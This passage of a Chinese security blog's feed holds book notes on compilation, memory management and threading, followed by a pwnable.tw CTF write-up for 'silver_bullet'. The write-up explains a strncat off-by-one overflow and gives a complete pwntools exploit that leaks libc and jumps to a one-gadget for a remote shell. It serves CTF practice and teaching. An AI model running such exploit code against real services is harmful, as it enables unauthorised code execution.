      <url>2020/11/13/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E6%B8%A9%E6%95%85%E8%80%8C%E7%9F%A5%E6%96%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="第一章-温故而知新"><a href="#第一章-温故而知新" class="headerlink" title="第一章 温故而知新"></a>第一章 温故而知新</h1><h1 id="从-Hello-World-说起"><a href="#从-Hello-World-说起" class="headerlink" title="从 Hello World 说起"></a>从 Hello World 说起</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;studio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(“Hello World\n”);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于下列问题，能立刻反应出清晰又明确的答案吗？</p><blockquote><p>希望我看完后可以，以下为我的第一反应答案</p></blockquote><ul><li>程序为什么要被编译器编译了之后才可以运行？<br>因为程序不能被CPU直接识别。</li><li>编译器在把C语言转换成可以执行的机器码的过程中做了什么？怎么做的？<br>识别程序文法并翻译成汇编语言，然后再转化成机器码。</li><li>最后编译出来的可执行文件里面是什么？除了机器码还有什么？它们怎么存放的？它怎么实现的？<br>里面是机器码、魔数、各种表、字符串等。利用表存放在可执行文件的各个地方。</li><li><code>#include&lt;studio.h&gt;</code>是什么意思？把studio.h包含进来意味着什么？它们怎么存放的？<br>include关键字用于导入文件。包含进来意味着导入的文件名为studio.h。存放在c语言环境中，导入进来后直接在该代码行位置展开。</li><li>不同的编译器（Microsoft VC、GCC）和不同的硬件平台（x86、SPARC、MIPS、ARM），以及不同的操作系统（Windows、Linux、UNIX、Solaris），最终编译出来的结果一样吗？为什么？<br>编译器可能一样，硬件平台不一样，操作系统不一样。因为不同硬件对机器码的识别不同，不同操作系统的可执行文件格式不一样。</li><li>Hello World 程序是怎么运行起来的？它从哪儿开始执行，到哪儿结束？main函数之前发生了什么？main函数结束以后又发生了什么？<br>经过编译，链接之后可以执行。从libc_start_main开始。main函数之前经过了各种初始化，main函数结束之后经历了内存的资源的释放操作。</li><li>如果没有操作系统，Hello World可以运行吗？如果要在一台没有操作系统的机器上运行Hello World需要什么？应该怎么实现？<br>不可以直接运行。需要直接调配硬件资源去执行自己的程序。</li><li>printf是怎么实现的？它为什么可以有不定数量的参数？为什么它能够在终端上输出字符串？<br>printf是通过向一块内存内写入字符串来向终端中输出字符的。</li><li>Hello World程序在运行时，它在内存中是什么样子的？<br>代码段、数据段并链接到了系统中的库。</li></ul><h1 id="站得高，望得远"><a href="#站得高，望得远" class="headerlink" title="站得高，望得远"></a>站得高，望得远</h1><p>计算机软件体系结构采用一种层的结构，有一句名言：</p><p><strong>“计算机科学领域的任何问题都可以通过增加一个间接的中间层来解决”</strong></p><p>每个层次之间都需要相互通信，既然要通信就必须有一个通信的协议，我们一般将其称为<strong>接口（Interface）</strong>，接口的下面那层是接口的提供者，由它定义接口；接口的上面那层是接口的使用者，它使用该接口来实现所需要的功能。除了硬件和应用程序，其他都是所谓的中间层，每个中间层都是对它下面的那层的包装和扩展。</p><p>从整个层次结构上看，开发工具和应用程序是属于同一个层次的，因为它们都使用操作系统<strong>应用程序编程接口（Application Programming Interface）</strong>。</p><h1 id="操作系统做什么"><a href="#操作系统做什么" class="headerlink" title="操作系统做什么"></a>操作系统做什么</h1><p>操作系统的一个功能是提供抽象的接口，另外一个主要功能是管理硬件资源。</p><h2 id="不要让CPU打盹"><a href="#不要让CPU打盹" class="headerlink" title="不要让CPU打盹"></a>不要让CPU打盹</h2><ul><li>多道程序：当某个程序暂时无须使用CPU时，监控程序就把另外的正在等待CPU 资源的程序启动，使得CPU能够充分的利用起来。</li><li>分时系统：每个程序运行一段时间以后都主动让出CPU给其他程序，使得一段时间内每个程序都有机会运行一小段时间。</li><li>多任务系统：操作系统接管了所有的硬件资源，并且本身运行在一个受硬件保护的级别。所有的应用程序都以<strong>进程（Process）</strong>的方式运行在比操作系统权限更低的级别，每个进程都有自己独立的地址空间，CPU由操作系统统一进行分配，且操作系统可以强制剥夺CPU资源并且分配给它认为目前最需要的进程。</li></ul><h2 id="设备驱动"><a href="#设备驱动" class="headerlink" title="设备驱动"></a>设备驱动</h2><p>操作系统作为硬件层的上层，它是对硬件的管理和抽象。</p><p>由操作系统中的硬件驱动程序来完成繁琐的硬件细节。</p><h1 id="内存不够怎么办"><a href="#内存不够怎么办" class="headerlink" title="内存不够怎么办"></a>内存不够怎么办</h1><p>如何将计算机上有限的物理内存分配给多个程序使用？</p><h2 id="直接分配"><a href="#直接分配" class="headerlink" title="直接分配"></a>直接分配</h2><p>例如我们由128MB内存，程序A运行需要10MB，程序B运行需要100MB，如果我们要同时运行A和B，就将内存的前10MB分配给程序A，10MB-110MB分配给程序B。<br>问题：</p><ul><li>地址空间不隔离</li><li>内存使用效率低</li><li>程序运行的地址不稳定</li></ul><h2 id="分段"><a href="#分段" class="headerlink" title="分段"></a>分段</h2><p>基本思路是把一段与程序所需要的内存空间大小的虚拟空间映射到某个地址空间。程序中只用管虚拟空间，而实际的地址映射和转换由操作系统和硬件完成。</p><p>解决了上文的第一个和第三个问题。</p><h2 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h2><p>分页的基本方法是把地址空间人为地等分成固定大小的页，每一页的大小由硬件决定，或硬件支持多种大小的页，由操作系统决定页的大小。</p><p>我们把进程的虚拟地址空间按页分割，把常用的数据和代码页装载到内存中，把不常用的代码和数据保存在磁盘里，当需要用到的时候再把它从磁盘里取出来即可。</p><p>虚拟存储的实现需要依靠硬件的支持，对于不同的CPU来说是不同的。但是几乎所有硬件都采用一个叫<strong>MMU（Memory Management Unit）</strong>的部件来进行页映射。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CPU —Virtual Address—&gt; MMU —Physical Address—&gt; Physical Memory</span><br></pre></td></tr></table></figure><p>在页映射模式下，CPU发出的是Virtual Address，即我们的程序看到的是虚拟地址，经过MMU转换以后就变成了Physical Address。</p><h1 id="众人拾柴火焰高"><a href="#众人拾柴火焰高" class="headerlink" title="众人拾柴火焰高"></a>众人拾柴火焰高</h1><h2 id="线程基础"><a href="#线程基础" class="headerlink" title="线程基础"></a>线程基础</h2><h3 id="什么是线程"><a href="#什么是线程" class="headerlink" title="什么是线程"></a>什么是线程</h3><p><strong>线程（Thread）</strong>，有时被称为<strong>轻量级进程（Lightweight Process，LWP）</strong>，是程序执行流的最小单元。一个标准的线程由线程ID、当前指令指针（PC）、寄存器集合和堆栈组成。</p><p>一个进程由一个到多个线程组成，各个线程之间共享程序的内存空间（包括代码段、数据段、堆等）及一些进程级的资源（如打开文件和信号）。<br>使用多线程的原因：</p><ul><li>某个操作可能会陷入长时间的等待，等待的线程会进入睡眠状态，无法继续执行，多线程可以有效利用等待时间。</li><li>某个操作（常常是计算）会消耗大量的时间，如果只有一个线程，程序和用户之间的交互会中断。多线程可以让一个线程负责交互，另一个线程负责计算。</li><li>程序逻辑本身就要求并发操作，例如一个多端下载软件（Bittorrent）。</li><li>多CPU或多核计算机，本身具备同时执行多个线程的能力，单线程程序无法发挥计算机的全部计算能力。</li><li>相对于多进程应用，多线程在数据共享方面效率要高很多。</li></ul><h3 id="线程的访问权限"><a href="#线程的访问权限" class="headerlink" title="线程的访问权限"></a>线程的访问权限</h3><p>线程的访问非常自由，它可以访问进程内存里的所有数据，甚至包括其他线程的堆栈（如果它知道其他线程的堆栈地址），但实际运用中线程也拥有自己的私有存储空间：</p><ul><li><p>栈（尽管并非完全无法被其他线程访问，但一般情况下仍然可以认为是私有的数据）。</p></li><li><p>线程局部存储（Thread Local Storage，TLS）。线程局部存储是某些操作系统为线程单独提供的私有空间，但通常只具有很有限的容量。</p></li><li><p>寄存器（包括PC寄存器），寄存器是执行流的基本数据，因此为线程私有。</p><p>从C语言的角度看，数据在线程之间是否私有如下所示：</p><table><thead><tr><th align="center">线程私有：</th><th align="center">线程之间共享：</th></tr></thead><tbody><tr><td align="center">局部变量</td><td align="center">全局变量</td></tr><tr><td align="center">函数的参数</td><td align="center">堆上的数据</td></tr><tr><td align="center">TLS数据</td><td align="center">函数里的静态变量</td></tr><tr><td align="center"></td><td align="center">程序代码，任何线程都有权利读取并执行任何代码</td></tr><tr><td align="center"></td><td align="center">打开的文件，A线程打开的文件可以由B线程读写</td></tr></tbody></table></li></ul><h3 id="线程调度与优先级"><a href="#线程调度与优先级" class="headerlink" title="线程调度与优先级"></a>线程调度与优先级</h3><p>在线程数量小于等于处理器数量时（并且操作系统支持多处理器），线程的并发是真正的并发，不同的线程运行在不同的处理器上，彼此之间互不相干。<br>在单处理器对应多线程的情况下，并发是一种模拟出来的状态。操作系统会让这些多线程程序轮流执行，每次仅执行一小段时间，这样每个线程就“看起来”在同时执行。这样的一个不断在处理器傻姑娘切换不同线程的行为称之为<strong>线程调度（Thread Schedule）</strong>。在线程调度中，线程通常拥有至少三种状态：</p><ul><li><strong>运行（Running）</strong>：此时线程正在执行。</li><li><strong>就绪（Ready）</strong>：此时线程可以立刻运行，但CPU已经被占用。</li><li><strong>等待（Waiting）</strong>：此时线程正在等待某一事件（通常是I/O或者同步）发生，无法执行。</li></ul><p>处于运行中线程又一段可以执行的时间，这段时间称为<strong>时间片（Time Slice）</strong>，当时间片用尽的时候，该进程将进入就绪状态。</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-1-1.png"  alt=""></p><p>现在主流的调度方式都带有<strong>优先级调度（Priority Schedule）</strong>和<strong>轮转法（Round Robin）</strong>的痕迹。所谓轮转法，就是将各个线程轮流执行一小段时间。优先级调度则决定了线程按照什么顺序轮流执行。在具有优先级调度的系统中，线程都拥有各自的<strong>线程优先级（Thread Priority）</strong>，具有高优先级的线程会更早的执行。</p><p>一般把频繁等待的线程称之为<strong>IO密集型线程（IO Bound Thread）</strong>，而把很少等待的线程称为<strong>CPU密集型线程（CPU Bound Thread）</strong>。IO密集型线程总是比CPU密集型线程容易得到优先级的提升。</p><p>在优先级调度下，存在一种<strong>饿死（Starvation）</strong>的现象，一个线程被饿死，是说他的优先级较低，在它执行之前，总是有较高优先级的线程试图执行，因此这个低优先级线程始终无法执行。</p><p>线程的优先级改变一般有三种方式：</p><ul><li>用户执行优先级</li><li>根据进入等待状态的频繁程度提升或降低优先级</li><li>长时间得不到执行而被提升优先级</li></ul><h3 id="可抢占线程和不可抢占线程"><a href="#可抢占线程和不可抢占线程" class="headerlink" title="可抢占线程和不可抢占线程"></a>可抢占线程和不可抢占线程</h3><p>线程在用尽时间片之后会被强制剥夺继续执行的权利，而进入就绪状态，这个过程叫做<strong>抢占（Preemption）</strong>，即之后执行别的线程抢占了当前线程。</p><h3 id="Linux的多线程"><a href="#Linux的多线程" class="headerlink" title="Linux的多线程"></a>Linux的多线程</h3><p>在Linux内核中并不存在真正意义上的线程概念，Linux将所有的执行实体（无论是线程还是进程）都称为<strong>任务（Task）</strong>，每一个任务概念上都类似于一个单线程的进程，具有内存空间、执行实体、文件资源等。Linux下不同的任务之间可以选择共享内存空间，因而在实际意义上，共享了同一个内存空间的多个任务构成了一个进程，这些任务也就成了这个进程里的线程。</p><table><thead><tr><th align="center">系统调用</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">fork</td><td align="center">复制当前进程</td></tr><tr><td align="center">exec</td><td align="center">使用新的可执行映像覆盖当前的可执行映像</td></tr><tr><td align="center">clone</td><td align="center">创建子进程并从指定位置开始执行</td></tr></tbody></table><p>fork函数产生一个和当前进程完全一样的新进程，并和当前函数一样从fork函数里返回，但不同的是本任务的fork函数将返回新任务pid，而新任务的fork将返回0。fork并不复制原任务的内存空间，而是和原任务一起共享一个<strong>写时复制（Cpoy on Write，COW）</strong>的内存空间。所谓写时复制，指的是两个任务可以同时自由地读取内存，但任意一个任务试图对内存进行修改时，内存都会复制一份提供给修改方单独使用，以免影响到其他的任务使用。</p><p>fork只能产生本任务的镜像，所以要使用exec配合才能够启动别的新任务。exec可以用新的可执行映像替换当前的可执行映像。</p><p>而如果要产生新线程，可以用clone。clone可以产生一个新的任务，从指定的位置开始执行，并且（可选的）共享当前进程的内存空间和文件等，如此就可以在实际效果上产生一个新线程。</p><h2 id="线程安全"><a href="#线程安全" class="headerlink" title="线程安全"></a>线程安全</h2><h3 id="竞争与原子操作"><a href="#竞争与原子操作" class="headerlink" title="竞争与原子操作"></a>竞争与原子操作</h3><p>如果多线程同时访问一个共享数据并进行操作（例如自增），就可能产生错误的值，因为这个操作被编译为汇编代码后不止一条指令，因此在执行的时候可能执行了一半就被调度系统打断，去执行别的代码。我们把单指令的操作称为<strong>原子的（Atomic）</strong>，因为无论如何，单条指令的执行是不会被打断的。</p><p>但是面对复杂的操作，原子操作指令就力不从心了，这个时候我们就需要更加通用的手段：锁。</p><h3 id="同步与锁"><a href="#同步与锁" class="headerlink" title="同步与锁"></a>同步与锁</h3><p>为了避免多个线程同时读写同一个数据而产生不可预料的后果，我们需要将各个线程对同一个数据的访问<strong>同步（Synchronization）</strong>，就是说在一个线程访问数据未结束的时候，其他线程不得对同一个数据进行访问，相当于对数据的访问被原子化了。</p><p>同步的最常见方式是用<strong>锁（Lock）</strong>。锁是一种非强制机制，每一个线程在访问数据或资源之前首先试图<strong>获取（Acquire）</strong>锁，并在访问结束之后<strong>释放（Release）</strong>锁。在锁已经被占用的时候试图获取锁时，线程会等待，直到锁重新可用。</p><p><strong>二元信号量（Binary Semaphore）</strong>是最简单的一种锁，它只有两种状态：占用与非占用。它适合只能被唯一一个线程独占访问的资源，当二元信号量处于非占用状态时，第一个试图获取该二元信号量的线程会获得该锁，并将二元信号量重置为占用状态，此后其他的所有试图获取该二元信号量的线程将会等待，直到该锁被释放。</p><p>对于运行多个线程并发访问的资源，多元信号量简称<strong>信号量（Semaphore）</strong>，一个初始值为N的信号量允许N个线程并发访问。线程访问资源的时候首先获取信号量：</p><ul><li>将信号量的值减一</li><li>如果信号量的值小于0，则进入等待状态，否则继续执行</li></ul><p>访问完资源后，线程释放信号量：</p><ul><li>将信号量的值加一</li><li>如果信号量的值小于1，唤醒一个等待中的线程。</li></ul><p><strong>互斥量（Mutex）</strong>和二元信号量类似，资源仅同时允许一个线程访问。但信号量可用被系统中的一个线程获取之后由另一个线程释放。而互斥量则要求哪个线程获取量互斥量，哪个线程就要负责释放这个锁。</p><p><strong>临界区（Critical Section）</strong>是比互斥量更加严格的同步手段。互斥量和信号量在系统的任何进程里都是可见的，也就是说，一个进程创建了一个互斥量或信号量，另一个进程试图获取该锁是合法的，但是临界区的作用范围仅限于本进程，其他的进程无法获取该锁。</p><p><strong>读写锁（Read-Write Lock）</strong>有两种获取方式，<strong>共享的（Shared）</strong>或<strong>独占的（Exclusive）</strong>。</p><table><thead><tr><th align="center">读写锁状态</th><th align="center">以共享方式获取</th><th align="center">以独占方式获取</th></tr></thead><tbody><tr><td align="center">自由</td><td align="center">成功</td><td align="center">成功</td></tr><tr><td align="center">共享</td><td align="center">成功</td><td align="center">等待</td></tr><tr><td align="center">独占</td><td align="center">等待</td><td align="center">等待</td></tr></tbody></table><p><strong>条件变量（Condition Variable）</strong>作为一种同步手段，作用类似于一个栅栏。线程可以等待条件变量，一个条件变量可以被多个线程等待；线程也可以唤醒条件变量，此时某个或所有等待此条件变量的线程都会被唤醒并继续支持。</p><h3 id="可重入（Reentrant）与线程安全"><a href="#可重入（Reentrant）与线程安全" class="headerlink" title="可重入（Reentrant）与线程安全"></a>可重入（Reentrant）与线程安全</h3><p>一个函数被重入，表示这个函数没有执行完成，由于外部因素或内部调用，又一次进入该函数执行。一个函数要被重入，只有两种情况：</p><ul><li>多个线程同时执行这个函数</li><li>函数自身（可能是经过多层调用之后）调用自身</li></ul><p>一个函数被称为可重入的，表明该函数被重入之后不会产生任何不良后果，必须具有以下几个特点：</p><ul><li>不使用任何（局部）静态或全局的非const变量</li><li>不返回任何（局部）静态或全局的非const变量的指针</li><li>仅依赖与调用方提供的参数</li><li>不依赖任何单个资源的锁（mutex等）</li><li>不调用任何不可重入的函数</li></ul><h3 id="过度优化"><a href="#过度优化" class="headerlink" title="过度优化"></a>过度优化</h3><p>编译器为了提高效率可能会把值放到寄存器中、交换毫不相干的两条相邻指令的执行顺序，CPU的动态调度为了提高效率也可能交换指令的顺序。</p><p>我们可以使用volatile关键字试图阻止过度优化，volatile可以：</p><ul><li>阻止编译器为了提高速度将一个变量缓存到寄存器内而不写回</li><li>阻止编译器调整操作volatile变量的指令顺序</li></ul><p>而如果需要阻止CPU换序，通常操作是调用CPU提供的一条常常被称为barrier的指令，一条barrier指令会阻止CPU将该指令之前的指令交换到barrier之后，反之依然。</p><h2 id="多线程内部情况"><a href="#多线程内部情况" class="headerlink" title="多线程内部情况"></a>多线程内部情况</h2><p>线程的并发执行是由多处理器或操作系统调度来实现的。用户实际使用的是存在于用户态的用户线程，并不一定在操作系统内核里对应同等数量的内核线程（注：这里的内核线程和Linux内核里的Kernel_thread并不是一回事）。</p><h3 id="一对一模型"><a href="#一对一模型" class="headerlink" title="一对一模型"></a>一对一模型</h3><p>对于直接支持线程的系统，一对一模型始终是最简单的模型。一个用户使用的线程就唯一对应一个内核使用的线程（反过来不一定）。这样用户线程就有了和内核线程一样的优点，线程之间的并发是真正的并发，一个线程因为某原因阻塞时，其他线程执行不会受到影响。</p><p>缺点：</p><ul><li>由于许多操作系统限制了内核线程的数量，因此一对一线程会让用户的线程数量受到限制</li><li>许多操作系统内核线程调度时，上下文切换的开销较大，导致用户线程的执行效率下降</li></ul><h3 id="多对一模型"><a href="#多对一模型" class="headerlink" title="多对一模型"></a>多对一模型</h3><p>多对一模型将多个用户线程映射到一个内核线程上，线程之间的切换由用户态的代码来进行，因此相对于一对一模型，多对一模型的线程切换要快速许多，同时拥有近乎无限制的线程数量。</p><p>缺点：</p><ul><li>如果其中一个用户线程阻塞，那么所有的线程都将无法执行，因为此时内核里的线程也随之阻塞了</li><li>在多处理器系统上，处理器的增多对多对一模型的线程性能不会有明显的帮助</li></ul><h3 id="多对多模型"><a href="#多对多模型" class="headerlink" title="多对多模型"></a>多对多模型</h3><p>多对多模型是将多个用户线程映射到少数但不只一个内核线程上</p><p>特点：</p><ul><li>一个用户线程阻塞并不会使得所有的用户线程阻塞，因为此时还有别的线程可以被调度来执行</li><li>对用户线程的数量没什么限制</li><li>在多处理器系统上，多对多模型的线程也能得到一定的性能提升，不过提升幅度不如一对一模型高</li></ul>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 程序员的自我修养 </tag>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.tw-silver_bullet-strncat实现栈溢出</title>
      <link href="2020/11/04/pwnable-tw-silver-bullet-strncat%E5%AE%9E%E7%8E%B0%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
      <url>2020/11/04/pwnable-tw-silver-bullet-strncat%E5%AE%9E%E7%8E%B0%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ file silver_bullet </span><br><span class="line">silver_bullet: ELF <span class="number">32</span>-<span class="built_in">bit</span> LSB executable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib/ld-, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=<span class="number">8</span>c95d92edf8bf47b6c9c450e882b7142bf656a92, <span class="keyword">not</span> stripped</span><br><span class="line">$ checksec silver_bullet </span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>运行程序是一个游戏，用ida查看可得，获取胜利与get shell并没有什么关系</p><p>所以我们还是需要寻找可利用的漏洞</p><p>在power_up函数中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">power_up</span><span class="params">(<span class="keyword">char</span> *dest)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// [esp+30h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !*dest )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"You need create the bullet first !"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *((_DWORD *)dest + <span class="number">12</span>) &gt; <span class="number">0x2F</span>u )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"You can't power up any more !"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Give me your another description of bullet :"</span>);</span><br><span class="line">  read_input(&amp;s, <span class="number">48</span> - *((_DWORD *)dest + <span class="number">12</span>));  <span class="comment">// 新读取字符，要求总长度不大于0x30</span></span><br><span class="line">  <span class="built_in">strncat</span>(dest, &amp;s, <span class="number">48</span> - *((_DWORD *)dest + <span class="number">12</span>));<span class="comment">// 使用strncat在字符串的结尾追加n个字符</span></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(&amp;s) + *((_DWORD *)dest + <span class="number">12</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your new power is : %u\n"</span>, v3);</span><br><span class="line">  *((_DWORD *)dest + <span class="number">12</span>) = v3;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Enjoy it !"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>strncat并不是单纯的追加n个字符，还会额外添加一个\x00，而我们可以看到。当我们正好写入48个字符时，额外添加的\x00正好是存放字符串长度的地方*((_DWORD *)dest + 12)</p><p>所以此时原字符串长度被清零，故此时*((_DWORD *)dest + 12) = 0 + 我们再次添加的长度</p><p>于是我们又可以接着往后追加48 - *((_DWORD *)dest + 12)个字符，实现栈溢出</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>所以我们需要做的是首先栈溢出利用puts函数泄漏出libc地址，然后再次调用main函数执行system()实现get shell</p><p>需要注意的是：只有beat()成功时才会返回main，否则直接选4 return会以exit(0)方式退出，故而覆盖*dest+12处的数时，需要让他满足win的条件</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">elf = ELF(<span class="string">"./silver_bullet"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line">io = process(<span class="string">"silver_bullet"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">elf = ELF(<span class="string">"./silver_bullet"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line">io = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10103</span>)</span><br><span class="line"></span><br><span class="line">gadget_addr = <span class="number">0x3a819</span></span><br><span class="line">puts_addr = <span class="number">0x080484a8</span></span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">main_addr = <span class="number">0x08048954</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(s)</span>:</span></span><br><span class="line">io.recvuntil(<span class="string">"choice :"</span>)</span><br><span class="line">io.sendline(<span class="string">"1"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"bullet :"</span>)</span><br><span class="line">io.sendline(s)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">power</span><span class="params">(s)</span>:</span></span><br><span class="line">io.recvuntil(<span class="string">"choice :"</span>)</span><br><span class="line">io.sendline(<span class="string">"2"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"bullet :"</span>)</span><br><span class="line">io.sendline(s)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">beat</span><span class="params">()</span>:</span></span><br><span class="line">io.recvuntil(<span class="string">"choice :"</span>)</span><br><span class="line">io.sendline(<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="string">'a'</span>*<span class="number">47</span>)</span><br><span class="line">power(<span class="string">'a'</span>)</span><br><span class="line">payload = <span class="string">'\xff'</span>*<span class="number">7</span>+p32(puts_addr)+p32(main_addr)+p32(read_got)</span><br><span class="line">power(payload)</span><br><span class="line">beat()</span><br><span class="line">io.recvuntil(<span class="string">"You win !!\n"</span>)</span><br><span class="line">read_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">shell_addr=read_addr-libc.symbols[<span class="string">"read"</span>] + gadget_addr</span><br><span class="line">create(<span class="string">'a'</span>*<span class="number">47</span>)</span><br><span class="line">power(<span class="string">'a'</span>)</span><br><span class="line">payload2=<span class="string">'\xff'</span>*<span class="number">7</span> + p32(shell_addr)</span><br><span class="line">power(payload2)</span><br><span class="line">beat()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>参考：</p><ul><li><a href="https://kirin-say.top/2018/06/06/pwnable-tw-Silver-Bullet/" target="_blank" rel="noopener">pwnable.tw_Silver Bullet</a></li><li><a href="https://cloud.tencent.com/developer/article/1070137" target="_blank" rel="noopener">Pwnable.tw刷题之Silverbullet破解过程分享</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> pwnable.tw </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.tw-hacknote-用main_arena泄漏libc</title>
      <link href="2020/11/02/pwnable-tw-hacknote-%E7%94%A8main-arena%E6%B3%84%E6%BC%8Flibc/"/>
      <url>2020/11/02/pwnable-tw-hacknote-%E7%94%A8main-arena%E6%B3%84%E6%BC%8Flibc/</url>
      
